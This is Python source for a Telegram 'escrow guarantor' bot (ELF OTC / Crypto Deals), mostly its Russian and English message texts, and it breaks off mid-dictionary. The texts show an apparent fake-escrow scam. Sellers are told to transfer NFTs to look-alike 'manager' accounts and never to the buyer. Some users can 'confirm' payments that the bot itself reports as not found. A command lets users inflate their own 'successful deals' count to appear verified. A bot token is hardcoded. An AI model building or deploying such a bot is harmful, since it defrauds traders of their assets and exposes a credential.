import logging
import random
import string
import asyncio
import sys
import time
from datetime import datetime, timedelta
#from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
#from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
#from telegram.error import Conflict, NetworkError
import threading
from flask import Flask
import os
import threading
#from flask import Flask
import telebot
from telebot import TeleBot

bot = TeleBot("8365274638:AAGXMYTAVzH8V-ymffpHh1sgggifDtYoQeg") 

app = Flask(__name__)

@app.route('/')
def health_check():
    return "Бот работает!", 200

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def start_bot():
    bot.polling(none_stop=True)
    print("Бот запущен в фоне!")
threading.Thread(target=start_bot, daemon=True).start()

app = Flask(__name__)

@app.route('/')
def index():
    return "Бот активен", 200

app = Flask(__name__)
@app.route('/')
def index(): return "OK", 200

# Запускаем сервер в отдельном потоке, чтобы он не мешал боту
threading.Thread(target=run_web_server, daemon=True).start()


# ------------------ КОДЫ ЯЗЫКОВ ------------------
LANG_RU = 'ru'
LANG_EN = 'en'

# ------------------ ЛОКАЛИЗАЦИЯ ------------------
TEXTS = {
    LANG_RU: {
        # ---------- Главное меню и навигация ----------
        'welcome': (
            "Добро пожаловать в ELF OTC – надежный P2P-гарант\n\n"
            "💼 Покупайте и продавайте всё, что угодно – безопасно!\n\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n"
            "🔹 Удобное управление кошельками\n"
            "🔹 Реферальная система\n\n"
            "🔹 Безопасные сделки с гарантией\n"
            "\n"
            "Выберите нужный раздел ниже:""\n\n"

        ),
        'choose_language': "🌐 Пожалуйста, выберите язык:",
        'language_selected': "✅ Язык установлен: Русский",
        'back_to_menu': "🔙 Вернуться в меню",

        # ---------- Кнопки главного меню ----------
        'btn_manage_requisites': "🪙Управление реквизитами",
        'btn_create_deal': "📝Создать сделку",
        'btn_my_balance': "💰Мой баланс",
        'btn_referral': "🧷Реферальная система",
        'btn_support': "📞Поддержка",

        # ---------- Управление реквизитами ----------
        'manage_requisites': "📥 Управление реквизитами\n\nИспользуйте кнопки ниже чтобы добавить/изменить реквизиты👇",
        'btn_add_wallet': "🪙Добавить/изменить TON-Кошелек",
        'btn_add_card': "💳Добавить/изменить карту",

        # ---------- Создание сделки ----------
        'create_deal_prompt': "💰Выберите метод получения оплаты:",
        'btn_deal_ton': "💎На TON-кошелек",
        'btn_deal_card': "💳На карту",
        'btn_deal_stars': "⭐️Звезды",
        'enter_amount': "💼 Создание сделки\n\nВведите сумму {unit} в формате: 100.5",
        'enter_description': "📝 Укажите, что вы предлагаете в этой сделке за {amount} {unit}:\n\nПример: 10 Кепок и Пепе...",
        'invalid_amount': "❌ Некорректный формат суммы. Используйте формат 100.5 {unit}",
        'deal_created': (
            "✅ Сделка успешно создана!\n\n"
            "💰 Сумма: {amount} {unit}\n"
            "💱 Валюта: {currency}\n"
            "📜 Описание: {description}\n"
            "🔗 Ссылка для покупателя:\n"
            "{link}\n\n"
            "Скопируйте ссылку и отправьте покупателю."
        ),

        # ---------- Баланс и вывод ----------
        'my_balance': (
            "💰 ВАШ БАЛАНС\n\n"
            "👤 Пользователь: @{username}\n"
            "💵 Баланс: {balance:.2f} руб\n\n"
            "💳 Информация о выводе средств:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "📋 Информация:\n"
            "• Комиссия системы: {fee}%\n"
            "• Мин. сумма вывода: {min_withdraw} руб\n"
            "{deals_requirement}"
            "• Вывод доступен на карту или TON-кошелек\n\n"
            "💼 Успешных сделок: {deals}"
        ),
        'btn_withdraw': "💳 Вывести средства",
        'btn_history': "📊 История операций",
        'withdraw_funds': (
            "💰 ВЫВОД СРЕДСТВ\n\n"
            "💵 Доступно к выводу: {balance:.2f} руб\n"
            "📋 Мин. сумма: {min_withdraw} руб\n"
            "{deals_requirement}"
            "Выберите способ вывода:"
        ),
        'btn_withdraw_card': "💳 На карту",
        'btn_withdraw_wallet': "🪙 На TON-кошелек",
        'insufficient_balance': (
            "❌ НЕДОСТАТОЧНО СРЕДСТВ ДЛЯ ВЫВОДА!\n\n"
            "💵 Ваш баланс: {balance:.2f} руб\n"
            "💰 Мин. сумма вывода: {min_withdraw} руб\n"
            "💸 Не хватает: {need:.2f} руб"
        ),
        'withdraw_to_card': (
            "💳 ВЫВОД НА КАРТУ\n\n"
            "🏦 Карта: <code>{card}</code>\n"
            "📊 Статус: {status_text}\n"
            "💵 Доступно: {balance:.2f} руб\n"
            "💰 Мин. сумма: {min_withdraw} руб\n\n"
            "📝 Введите сумму для вывода в рублях:"
        ),
        'withdraw_to_wallet': (
            "🪙 ВЫВОД НА TON-КОШЕЛЕК\n\n"
            "🏦 Кошелек: <code>{wallet}</code>\n"
            "📊 Статус: {status_text}\n"
            "💵 Доступно: {balance:.2f} руб\n"
            "💰 Мин. сумма: {min_withdraw} руб\n\n"
            "📝 Введите сумму для вывода в рублях:"
        ),
        'withdraw_immediate': "✅ Вывод сразу (новый пользователь)",
        'withdraw_needed': "⏳ Нужно ещё {needed} сделок",
        'withdraw_available': "✅ Вывод доступен",
        'withdraw_deficit': (
            "⏳ ДЛЯ ВЫВОДА НЕОБХОДИМО ПРОВЕСТИ ЕЩЁ {needed} УСПЕШНЫХ СДЕЛОК\n\n"
            "💵 Ваш баланс: {balance:.2f} руб\n"
            "💰 Мин. сумма вывода: {min_withdraw} руб\n"
            "💼 Ваши успешные сделки: {deals}\n"
            "📊 Требуется: {min_deals}"
        ),
        'deals_requirement': "• Для вывода необходимо иметь {min_deals} успешных сделок\n",
        'no_card': "❌ Карта не добавлена",
        'no_wallet': "❌ TON-кошелек не добавлен",
        'withdraw_success': (
            "✅ ЗАЯВКА НА ВЫВОД ПРИНЯТА!\n\n"
            "💵 Сумма: {amount:.2f} руб\n"
            "📋 Способ: {method}\n"
            "📝 Реквизиты: {details}\n\n"
            "⏳ Заявка отправлена на обработку администратору.\n"
            "Обычно обработка занимает до 24 часов.\n\n"
            "🏦 Текущий баланс: {balance:.2f} руб\n\n"
            "📞 При возникновении вопросов обратитесь в поддержку."
        ),
        'withdraw_error': (
            "❌ **ОШИБКА ПРИ ОБРАБОТКЕ ВЫВОДА!**\n\n"
            "Пожалуйста, попробуйте позже или обратитесь в поддержку."
        ),
        'transaction_history': "📊 ИСТОРИЯ ОПЕРАЦИЙ\n\nРаздел находится в разработке.",

        # ---------- Добавление реквизитов ----------
        'add_wallet_prompt': (
            "🔑 Добавьте ваш TON-кошелек:\n\n"
            "Пожалуйста, отправьте адрес вашего кошелька\n\n"
            "📝 Важно:\n"
            "• Минимальная сумма вывода: {min_withdraw} руб"
        ),
        'add_wallet_change': (
            "🔑 Ваш текущий TON-кошелек:\n<code>{wallet}</code>\n\n"
            "📊 Статус: {status}\n\n"
            "Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню.\n\n"
            "📝 Правила вывода:\n"
            "• Минимальная сумма вывода: {min_withdraw} руб"
        ),
        'add_card_prompt': (
            "💳 Добавьте вашу карту:\n\n"
            "Пожалуйста, отправьте номер вашей карты\n\n"
            "📝 Важно:\n"
            "• Минимальная сумма вывода: {min_withdraw} руб"
        ),
        'add_card_change': (
            "💳 Ваш текущий номер карты:\n<code>{card}</code>\n\n"
            "📊 Статус: {status}\n\n"
            "Отправьте новый номер карты для изменения или нажмите кнопку ниже для возврата в меню.\n\n"
            "📝 Правила вывода:\n"
            "• Минимальная сумма вывода: {min_withdraw} руб"
        ),
        'wallet_saved': (
            "✅ TON-кошелек успешно сохранен!\n\n"
            "🔑 Ваш текущий TON-кошелек:\n<code>{wallet}</code>\n\n"
            "📝 Информация о выводе:\n"
            "• Минимальная сумма вывода: {min_withdraw} руб\n"
            "• Комиссия системы: {fee}%\n\n"
            "💼 Ваше текущее количество успешных сделок: {deals}"
        ),
        'card_saved': (
            "✅ Номер карты успешно сохранен!\n\n"
            "💳 Ваш текущий номер карты:\n<code>{card}</code>\n\n"
            "📝 Информация о выводе:\n"
            "• Минимальная сумма вывода: {min_withdraw} руб\n"
            "• Комиссия системы: {fee}%\n\n"
            "💼 Ваше текущее количество успешных сделок: {deals}"
        ),
        'invalid_wallet': "❌ Неверный формат кошелька. Пожалуйста, проверьте адрес и попробуйте снова.",
        'invalid_card': "❌ Неверный формат номера карты. Пожалуйста, проверьте номер и попробуйте снова.",

        # ---------- Сделки (покупатель) ----------
        'deal_info_buyer': (
            "💳 Информация о сделке #{deal_id}\n\n"
            "👤 Вы покупатель в сделке.\n"
            "📌 Продавец: @{seller}\n\n"
            "📦 Вы покупаете: {description}\n\n"
            "{payment_info}\n"
            "💰 Сумма к оплате: {amount} {unit}\n\n"
            "{warning}"
        ),
        'payment_info_ton': (
            "🏦 Адрес для оплаты:\n"
            "<code>{wallet}</code>\n\n"
            "📝 Комментарий к платежу (мемо):\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_card': (
            "🏦 Номер карты для оплаты:\n"
            "<code>{card}</code>\n\n"
            "📝 Назначение платежа:\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_stars': (
            "🏦 Способ оплаты: {currency}\n\n"
            "📝 ID сделки: <code>{deal_id}</code>\n\n"
        ),
        'warning_ton': (
            "⚠️ ВАЖНО: При отправке платежа ОБЯЗАТЕЛЬНО укажите комментарий (мемо) как указано выше!\n\n"
            "📌 Инструкция по оплате:\n"
            "1. Скопируйте адрес TON-кошелька\n"
            "2. Скопируйте комментарий (мемо)\n"
            "3. Отправьте точную сумму {amount} TON\n"
            "4. Вставьте комментарий в поле 'Memo' / 'Комментарий'\n\n"
            "❌ БЕЗ КОММЕНТАРИЯ ПЛАТЕЖ НЕ БУДЕТ ЗАЧИСЛЕН!\n"
            "В случае ошибки заполните форму — @eIfsupportotc"
        ),
        'warning_card': (
            "⚠️ ВАЖНО: При переводе ОБЯЗАТЕЛЬНО укажите назначение платежа как указано выше!\n\n"
            "📌 Инструкция по оплате:\n"
            "1. Скопируйте номер карты\n"
            "2. Скопируйте назначение платежа\n"
            "3. Отправьте точную сумму {amount} ₽\n"
            "4. Вставьте назначение платежа в поле 'Назначение' / 'Комментарий'\n\n"
            "❌ БЕЗ ПРАВИЛЬНОГО НАЗНАЧЕНИЯ ПЛАТЕЖ НЕ БУДЕТ ЗАЧИСЛЕН!\n"
            "В случае проблем с оплатой обратитесь в поддержку — @eIfsupportotc"
        ),
        'warning_stars': (
            "⚠️ Пожалуйста, следуйте инструкциям продавца по оплате.\n"
            "Сохраните ID сделки для подтверждения!\n\n"
            "В случае проблем с оплатой обратитесь в поддержку — @eIfsupportotc"
        ),
        'btn_confirm_payment': "✅ Подтвердить оплату",
        'btn_exit_deal': "❌ Выйти со сделки",
        'payment_confirmed_unauthorized': (
            "⏳ ОПЛАТА НА ПРОВЕРКЕ\n\n"
            "✅ Вы нажали кнопку подтверждения оплаты.\n"
            "💰 Сумма: {amount} {unit}\n"
            "📦 Товар: {description}\n"
            "🔗 ID сделки: #{deal_id}\n\n"
            "❌ Оплата не найдена\n"
            "⏳ Ожидайте подтверждение оплаты в течение 10 минут.\n\n"
            "📌 Дальнейшие действия:\n"
            "1. После успешной оплаты средства будут автоматически зачислены\n"
            "2. Продавец получит уведомление о вашем платеже\n"
            "3. Продавец передаст товар менеджеру\n"
            "4. После проверки вы получите уведомление о завершении сделки\n\n"
            "📞 При возникновении вопросов обратитесь в поддержку."
        ),
        'payment_confirmed_authorized': (
            "✅ Оплата подтверждена! Продавец уведомлен о вашем платеже.\n\n"
            "⏳ **Ожидайте подтверждения передачи NFT от менеджера...**\n\n"
            "📊 Ваша статистика обновлена:\n"
            "• Успешных сделок: {deals}\n\n"
            "Ожидайте получения товара через менеджера."
        ),
        'payment_confirmation_error': "⚠️ Платеж подтвержден, но возникли проблемы с уведомлениями. Свяжитесь с поддержкой.",

        # ---------- Сделки (продавец) ----------
        'seller_deal_info': (
            "📋 Ваша сделка #{deal_id}\n\n"
            "📊 Успешных сделок у вас: {deals}\n\n"
            "📦 Предложение: {description}\n"
            "💰 Сумма: {amount} {unit}\n"
            "💱 Валюта: {currency}\n\n"
            "🔗 Ссылка для покупателя:\n"
            "{link}\n\n"
            "ℹ️ Когда покупатель присоединится к сделке, вы получите уведомление."
        ),
        'new_buyer_notification': (
            "👤 Пользователь @{buyer}\n"
            "Присоединился к сделке #{deal_id}\n\n"
            "{buyer_stats}\n\n"
            "⚠️ Проверьте соответствие пользователя"
        ),
        'buyer_stats': "📊 Успешных сделок покупателя: {count}\n{status}",
        'authorized_status': "✅ Проверенный пользователь",
        'unauthorized_status': "⚠️ Новый пользователь",

        # ---------- Подтверждение оплаты продавцу ----------
        'payment_received_seller': (
            "💰 ПЛАТЕЖ ПОДТВЕРЖДЕН!\n\n"
            "✅ Покупатель @{buyer} подтвердил оплату\n"
            "📦 Сделка: #{deal_id}\n"
            "💎 Товар: {description}\n"
            "💵 Сумма: {amount} {unit}\n\n"
            "📊 **Финансовые условия:**\n"
            "• Комиссия системы: {fee_percent}% ({fee:.2f} руб)\n"
            "• К зачислению на баланс: {net:.2f} руб\n\n"
            "⚠️ ТРЕБУЕТСЯ ВАШЕ ДЕЙСТВИЕ:\n"
            "1. Передайте товар менеджеру @CryptoDealsEscrow\n"
            "2. После передачи нажмите кнопку ниже\n"
            "3. Менеджер подтвердит получение NFT\n"
            "4. Сумма {net:.2f} руб будет зачислена на ваш баланс\n\n"
            "❌ **Не передавайте товар покупателю напрямую!**"
        ),
        'btn_request_transfer': "📦 Подать заявку на передачу NFT",
        'btn_cancel_deal': "❌ Отменить сделку",

        # ---------- Заявка на передачу NFT ----------
        'transfer_request_submitted': (
            "✅ ЗАЯВКА НА ПЕРЕДАЧУ NFT ПОДАНА!\n\n"
            "🔗 Сделка: #{deal_id}\n"
            "📦 Товар: {description}\n"
            "💰 К зачислению: {net:.2f} руб\n\n"
            "📞 Менеджеры уведомлены о вашей заявке.\n"
            "⏳ Ожидайте подтверждения получения NFT от менеджера.\n\n"
            "ℹ️ Как только менеджер подтвердит получение NFT, сумма {net:.2f} руб будет зачислена на ваш баланс."
        ),
        'transfer_request_error': "⚠️ Заявка подана, но возникли проблемы с уведомлением менеджеров. Свяжитесь с поддержкой.",

        # ---------- Уведомления менеджерам ----------
        'manager_transfer_request': (
            "📦 ЗАЯВКА НА ПЕРЕДАЧУ NFT\n\n"
            "🔗 ID сделки: #{deal_id}\n"
            "👤 Продавец: @{seller} (ID: {seller_id})\n"
            "👤 Покупатель: @{buyer}\n"
            "💰 Сумма: {amount} {unit}\n"
            "💎 Товар: {description}\n\n"
            "📊 **Финансовые условия:**\n"
            "• Комиссия: {fee:.2f} руб ({fee_percent}%)\n"
            "• К зачислению продавцу: {net:.2f} руб\n\n"
            "⚠️ **Продавец заявил о передаче NFT.**\n"
            "Пожалуйста, проверьте получение NFT и подтвердите ниже:"
        ),
        'btn_manager_confirm': "✅ Подтвердить получение NFT",
        'btn_manager_reject': "❌ NFT не получен",

        # ---------- Подтверждение менеджера ----------
        'manager_confirmed': (
            "✅ ПЕРЕДАЧА NFT ПОДТВЕРЖДЕНА!\n\n"
            "🔗 Сделка: #{deal_id}\n"
            "💰 Зачислено продавцу: {net:.2f} руб\n"
            "👤 Продавец уведомлен о подтверждении\n"
            "👤 Покупатель уведомлен о завершении сделки\n\n"
            "🎉 **Сделка успешно завершена!**"
        ),
        'manager_rejected': (
            "❌ ЗАЯВКА НА ПЕРЕДАЧУ NFT ОТКЛОНЕНА!\n\n"
            "🔗 Сделка: #{deal_id}\n\n"
            "⚠️ Продавец уведомлен об отклонении.\n"
            "Он должен передать NFT и снова подать заявку."
        ),
        'manager_action_error': "⚠️ Подтверждение получено, но возникли проблемы с уведомлениями.",

        # ---------- Уведомление покупателю о завершении ----------
        'buyer_deal_completed': (
            "🎉 СДЕЛКА ЗАВЕРШЕНА УСПЕШНО!\n\n"
            "✅ Менеджер подтвердил получение NFT от продавца\n"
            "👤 Продавец: @{seller}\n"
            "💰 Сумма: {amount} {unit}\n"
            "📦 Товар: {description}\n"
            "🔗 ID сделки: #{deal_id}\n\n"
            "📢 Ожидайте получения товара от менеджера\n\n"
            "⭐️ Спасибо за использование Crypto Deals!\n"
            "Ваша надежность повышена на 1 пункт."
        ),

        # ---------- Уведомление продавцу о зачислении ----------
        'seller_funds_credited': (
            "✅ ПЕРЕДАЧА NFT ПОДТВЕРЖДЕНА МЕНЕДЖЕРОМ!\n\n"
            "🔗 Сделка: #{deal_id}\n"
            "📦 Товар: {description}\n"
            "💰 Сумма сделки: {amount} руб\n"
            "📊 Комиссия системы: {fee:.2f} руб\n\n"
            "💰 **СРЕДСТВА ЗАЧИСЛЕНЫ НА ВАШ БАЛАНС!**\n"
            "💵 Зачислено: {net:.2f} руб\n"
            "🏦 Текущий баланс: {balance:.2f} руб\n\n"
            "🎉 Сделка успешно завершена!\n"
            "Покупатель уведомлен о завершении сделки.\n\n"
            "⭐️ Спасибо за честную торговлю!\n"
            "Ваша надежность повышена на 1 пункт."
        ),
        'btn_back_to_menu': "🏠 Вернуться в главное меню",

        # ---------- Уведомление продавцу об отклонении ----------
        'seller_transfer_rejected': (
            "❌ ЗАЯВКА НА ПЕРЕДАЧУ NFT ОТКЛОНЕНА\n\n"
            "🔗 Сделка: #{deal_id}\n"
            "📦 Товар: {description}\n\n"
            "⚠️ **Менеджер не получил NFT!**\n\n"
            "📌 **Дальнейшие действия:**\n"
            "1. Передайте NFT менеджеру @eIfsupportotc\n"
            "2. После передачи снова нажмите 'Подать заявку на передачу NFT'\n"
            "3. Менеджер подтвердит получение\n"
            "4. Средства будут зачислены на ваш баланс\n\n"
            "❌ Не передавайте товар покупателю напрямую!"
        ),

        # ---------- Отмена сделки ----------
        'deal_cancelled': "❌ Сделка #{deal_id} отменена.\nВсе участники уведомлены об отмене.",
        'buyer_deal_cancelled': "❌ Сделка #{deal_id} была отменена продавцом.",

        # ---------- Поддержка ----------
        'support_message': "Для связи с поддержкой нажмите на кнопку ниже:",

        # ---------- Реферальная система ----------
        'referral_system': "Раздел 'Реферальная система' в разработке",

        # ---------- Команды (статистика и пр.) ----------
        'my_stats': (
            "📊 ВАША СТАТИСТИКА\n\n"
            "👤 Пользователь: @{username}\n"
            "🆔 ID: {user_id}\n"
            "💼 Успешных сделок: {deals}\n"
            "💰 Баланс: {balance:.2f} руб\n"
            "🎯 Статус: {status}\n\n"
            "💳 Информация о выводе средств:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "📝 Правила вывода:\n"
            "• Минимум: {min_withdraw} руб\n"
            "{deals_requirement}"
            "• Комиссия системы: {fee}%\n\n"
            "💡 Доступные функции:\n"
            "{functions}"
        ),
        'function_confirm_payment': "• Подтверждение оплаты в сделках",
        'function_not_available': "• (Недоступно)",
        'function_change_stats': "• Изменение статистики",
        'function_view_stats': "• Просмотр статистики",
        'function_withdraw': "• Вывод средств с баланса",
        'set_my_deals_current': "📊 Ваше текущее количество успешных сделок: {deals}\n\nЧтобы установить новое значение, используйте:\n`/set_my_deals 10`",
        'set_my_deals_success': "✅ Количество успешных сделок установлено: {deals}\n\n📊 Теперь ваша статистика:\n• Успешных сделок: {deals}\n• Статус: ✅ Авторизован\n\n📢 Это количество будет отображаться продавцам, когда вы будете покупателем в сделке!",
        'set_my_deals_negative': "❌ Количество сделок не может быть отрицательным",
        'set_my_deals_invalid': "❌ Неверный формат числа. Используйте целое число, например: `/set_my_deals 15`",

        # ---------- Общие ошибки ----------
        'error_occurred': "Произошла ошибка. Пожалуйста, попробуйте еще раз.",
        'deal_not_found': "❌ Сделка не найдена или была удалена",
        'not_seller': "❌ Вы не являетесь продавцом в этой сделке",
        'not_buyer': "❌ Вы не являетесь покупателем в этой сделке",
        'not_authorized': (
            "❌ У вас нет доступа к подтверждению оплат\n\n"
            "Для получения доступа к этой функции свяжитесь с поддержкой."
        ),
        'buy_command_usage': (
            "❌ Команда /buy доступна только для покупателей в активной сделке\n\n"
            "Используйте:\n"
            "`/buy deal_id`\n\n"
            "где deal_id - ID сделки, в которой вы являетесь покупателем."
        ),
    },

    # ------------------ АНГЛИЙСКАЯ ВЕРСИЯ ------------------
    LANG_EN: {
        'welcome': (
            "Welcome 👋\n\n"
            "💼 Crypto Deals - We are a specialized service for ensuring the security of over-the-counter transactions.\n\n"
            "✨ Automated execution algorithm.\n"
            "⚡️ Speed and automation.\n"
            "💳 Convenient and fast withdrawal of funds.\n\n"
            "• Service fee: 0%\n"
            "• Working hours: 24/7\n"
            "• Technical support: @eIfsupportotc\n\n"
            "🛡️ Choose the desired section below:"
        ),
        'choose_language': "🌐 Please choose your language:",
        'language_selected': "✅ Language set: English",
        'back_to_menu': "🔙 Back to menu",

        'btn_manage_requisites': "📩Manage requisites",
        'btn_create_deal': "📝Create deal",
        'btn_my_balance': "💰My balance",
        'btn_referral': "🔗Referral system",
        'btn_support': "📞Support",

        'manage_requisites': "📥 Manage requisites\n\nUse the buttons below to add/change requisites👇",
        'btn_add_wallet': "🪙Add/change TON Wallet",
        'btn_add_card': "💳Add/change card",

        'create_deal_prompt': "💰Choose payment method:",
        'btn_deal_ton': "💎To TON wallet",
        'btn_deal_card': "💳To card",
        'btn_deal_stars': "⭐️Stars",
        'enter_amount': "💼 Creating a deal\n\nEnter amount in {unit} (e.g., 100.5):",
        'enter_description': "📝 Describe what you are offering in this deal for {amount} {unit}:\n\nExample: 10 Caps and Pepes...",
        'invalid_amount': "❌ Invalid amount format. Use format like 100.5 {unit}",
        'deal_created': (
            "✅ Deal successfully created!\n\n"
            "💰 Amount: {amount} {unit}\n"
            "💱 Currency: {currency}\n"
            "📜 Description: {description}\n"
            "🔗 Link for buyer:\n"
            "{link}\n\n"
            "Copy the link and send it to the buyer."
        ),

        'my_balance': (
            "💰 YOUR BALANCE\n\n"
            "👤 User: @{username}\n"
            "💵 Balance: {balance:.2f} RUB\n\n"
            "💳 Withdrawal information:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "📋 **Information:**\n"
            "• System fee: {fee}%\n"
            "• Min withdrawal: {min_withdraw} RUB\n"
            "{deals_requirement}"
            "• Withdrawal available to card or TON wallet\n\n"
            "💼 Successful deals: {deals}"
        ),
        'btn_withdraw': "💳 Withdraw funds",
        'btn_history': "📊 Transaction history",
        'withdraw_funds': (
            "💰 WITHDRAWAL\n\n"
            "💵 Available: {balance:.2f} RUB\n"
            "📋 Min amount: {min_withdraw} RUB\n"
            "{deals_requirement}"
            "Choose withdrawal method:"
        ),
        'btn_withdraw_card': "💳 To card",
        'btn_withdraw_wallet': "🪙 To TON wallet",
        'insufficient_balance': (
            "❌ INSUFFICIENT BALANCE FOR WITHDRAWAL!\n\n"
            "💵 Your balance: {balance:.2f} RUB\n"
            "💰 Min withdrawal: {min_withdraw} RUB\n"
            "💸 Needed: {need:.2f} RUB"
        ),
        'withdraw_to_card': (
            "💳 WITHDRAW TO CARD\n\n"
            "🏦 Card: <code>{card}</code>\n"
            "📊 Status: {status_text}\n"
            "💵 Available: {balance:.2f} RUB\n"
            "💰 Min amount: {min_withdraw} RUB\n\n"
            "📝 Enter amount to withdraw in RUB:"
        ),
        'withdraw_to_wallet': (
            "🪙 WITHDRAW TO TON WALLET\n\n"
            "🏦 Wallet: <code>{wallet}</code>\n"
            "📊 Status: {status_text}\n"
            "💵 Available: {balance:.2f} RUB\n"
            "💰 Min amount: {min_withdraw} RUB\n\n"
            "📝 Enter amount to withdraw in RUB:"
        ),
        'withdraw_immediate': "✅ Immediate withdrawal (new user)",
        'withdraw_needed': "⏳ Need {needed} more deals",
        'withdraw_available': "✅ Withdrawal available",
        'withdraw_deficit': (
            "⏳ YOU NEED {needed} MORE SUCCESSFUL DEALS TO WITHDRAW\n\n"
            "💵 Your balance: {balance:.2f} RUB\n"
            "💰 Min withdrawal: {min_withdraw} RUB\n"
            "💼 Your successful deals: {deals}\n"
            "📊 Required: {min_deals}"
        ),
        'deals_requirement': "• You need {min_deals} successful deals to withdraw\n",
        'no_card': "❌ Card not added",
        'no_wallet': "❌ TON wallet not added",
        'withdraw_success': (
            "✅ WITHDRAWAL REQUEST ACCEPTED!\n\n"
            "💵 Amount: {amount:.2f} RUB\n"
            "📋 Method: {method}\n"
            "📝 Details: {details}\n\n"
            "⏳ Request sent to admin for processing.\n"
            "Usually processing takes up to 24 hours.\n\n"
            "🏦 Current balance: {balance:.2f} RUB\n\n"
            "📞 If you have questions, contact support."
        ),
        'withdraw_error': (
            "❌ **WITHDRAWAL ERROR!**\n\n"
            "Please try again later or contact support."
        ),
        'transaction_history': "📊 TRANSACTION HISTORY\n\nSection under development.",

        'add_wallet_prompt': (
            "🔑 Add your TON wallet:\n\n"
            "Please send your wallet address\n\n"
            "📝 Important:\n"
            "• Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'add_wallet_change': (
            "🔑 Your current TON wallet:\n<code>{wallet}</code>\n\n"
            "📊 Status: {status}\n\n"
            "Send new wallet address to change or press button below to return to menu.\n\n"
            "📝 Withdrawal rules:\n"
            "• Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'add_card_prompt': (
            "💳 Add your card:\n\n"
            "Please send your card number\n\n"
            "📝 Important:\n"
            "• Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'add_card_change': (
            "💳 Your current card number:\n<code>{card}</code>\n\n"
            "📊 Status: {status}\n\n"
            "Send new card number to change or press button below to return to menu.\n\n"
            "📝 Withdrawal rules:\n"
            "• Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'wallet_saved': (
            "✅ TON wallet successfully saved!\n\n"
            "🔑 Your current TON wallet:\n<code>{wallet}</code>\n\n"
            "📝 Withdrawal information:\n"
            "• Minimum withdrawal amount: {min_withdraw} RUB\n"
            "• System fee: {fee}%\n\n"
            "💼 Your successful deals: {deals}"
        ),
        'card_saved': (
            "✅ Card number successfully saved!\n\n"
            "💳 Your current card number:\n<code>{card}</code>\n\n"
            "📝 **Withdrawal information:**\n"
            "• Minimum withdrawal amount: {min_withdraw} RUB\n"
            "• System fee: {fee}%\n\n"
            "💼 Your successful deals: {deals}"
        ),
        'invalid_wallet': "❌ Invalid wallet format. Please check the address and try again.",
        'invalid_card': "❌ Invalid card number format. Please check the number and try again.",

        'deal_info_buyer': (
            "💳 Deal information #{deal_id}\n\n"
            "👤 You are the buyer in this deal.\n"
            "📌 Seller: @{seller}\n\n"
            "📦 You are buying: {description}\n\n"
            "{payment_info}\n"
            "💰 Amount to pay: {amount} {unit}\n\n"
            "{warning}"
        ),
        'payment_info_ton': (
            "🏦 Payment address:\n"
            "<code>{wallet}</code>\n\n"
            "📝 Memo:\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_card': (
            "🏦 Card number for payment:\n"
            "<code>{card}</code>\n\n"
            "📝 Payment reference:\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_stars': (
            "🏦 Payment method: {currency}\n\n"
            "📝 Deal ID: <code>{deal_id}</code>\n\n"
        ),
        'warning_ton': (
            "⚠️ IMPORTANT: When sending payment, you MUST include the memo as above!\n\n"
            "📌 Payment instructions:\n"
            "1. Copy TON wallet address\n"
            "2. Copy memo\n"
            "3. Send exact amount {amount} TON\n"
            "4. Paste memo in 'Memo' field\n\n"
            "❌ WITHOUT MEMO PAYMENT WILL NOT BE CREDITED!\n"
            "If you make a mistake, contact @eIfsupportotc"
        ),
        'warning_card': (
            "⚠️ IMPORTANT: When transferring, you MUST include the payment reference as above!\n\n"
            "📌 Payment instructions:\n"
            "1. Copy card number\n"
            "2. Copy payment reference\n"
            "3. Send exact amount {amount} RUB\n"
            "4. Paste reference in 'Payment reference' / 'Comment' field\n\n"
            "❌ WITHOUT CORRECT REFERENCE PAYMENT WILL NOT BE CREDITED!\n"
            "If you have problems, contact support — @eIfsupportotc"
        ),
        'warning_stars': (
            "⚠️ Please follow seller's payment instructions.\n"
            "Save the deal ID for confirmation!\n\n"
            "If you have problems, contact support — @eIfsupportotc"
        ),
        'btn_confirm_payment': "✅ Confirm payment",
        'btn_exit_deal': "❌ Exit deal",
        'payment_confirmed_unauthorized': (
            "⏳ PAYMENT UNDER VERIFICATION\n\n"
            "✅ You pressed the payment confirmation button.\n"
            "💰 Amount: {amount} {unit}\n"
            "📦 Item: {description}\n"
            "🔗 Deal ID: #{deal_id}\n\n"
            "❌ Payment not found\n"
            "⏳ Please wait for payment confirmation within 10 minutes.\n\n"
            "📌 Next steps:\n"
            "1. After successful payment, funds will be automatically credited\n"
            "2. Seller will be notified of your payment\n"
            "3. Seller will transfer item to manager\n"
            "4. After verification you will receive deal completion notification\n\n"
            "📞 If you have questions, contact support."
        ),
        'payment_confirmed_authorized': (
            "✅ Payment confirmed! Seller notified.\n\n"
            "⏳ Waiting for manager's NFT transfer confirmation...\n\n"
            "📊 Your stats updated:\n"
            "• Successful deals: {deals}\n\n"
            "Expect to receive item through manager."
        ),
        'payment_confirmation_error': "⚠️ Payment confirmed but there were issues with notifications. Contact support.",

        'seller_deal_info': (
            "📋 Your deal #{deal_id}\n\n"
            "📊 Your successful deals: {deals}\n\n"
            "📦 Offer: {description}\n"
            "💰 Amount: {amount} {unit}\n"
            "💱 Currency: {currency}\n\n"
            "🔗 Link for buyer:\n"
            "{link}\n\n"
            "ℹ️ When a buyer joins, you will be notified."
        ),
        'new_buyer_notification': (
            "👤 User @{buyer}\n"
            "Joined deal #{deal_id}\n\n"
            "{buyer_stats}\n\n"
            "⚠️ Verify the user's identity"
        ),
        'buyer_stats': "📊 Buyer's successful deals: {count}\n{status}",
        'authorized_status': "✅ Verified user",
        'unauthorized_status': "⚠️ New user",

        'payment_received_seller': (
